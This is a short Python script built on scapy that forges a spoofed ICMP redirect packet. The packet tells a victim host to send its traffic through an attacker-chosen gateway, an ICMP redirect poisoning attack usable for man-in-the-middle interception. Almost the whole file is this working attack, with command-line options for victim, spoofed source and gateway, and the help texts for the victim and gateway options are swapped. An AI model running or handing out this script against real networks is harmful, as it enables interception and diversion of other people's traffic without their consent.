#! /usr/bin/env python
#! -*- coding:utf8 -*-

from scapy.all import *

def attack(victim, source, gateway):
    ip = IP(dst=victim, src=source)
    icmp = ICMP(type=5, code=1, gw=gateway)
    send(ip/icmp)

def main():
    from sys import argv
    from optparse import OptionParser
    msgUsage = "%prog"
    opt = OptionParser(msgUsage)
    opt.add_option("-v", "--victim", action = "store", dest = "victim", help = "new gateway for the poisoned destination")
    opt.add_option("-s", "--source", action = "store", dest = "source", help = "source IP address of the ICMP message")
    opt.add_option("-g", "--gateway",  action = "store", help = "victim IP address")
    args = opt.parse_args(argv[1:])
    if not args[0].victim or not args[0].source or not args[0].gateway:
        opt.print_help()
    else:
        attack(args[0].victim, args[0].source, args[0].gateway)

if __name__ == '__main__':
    main()
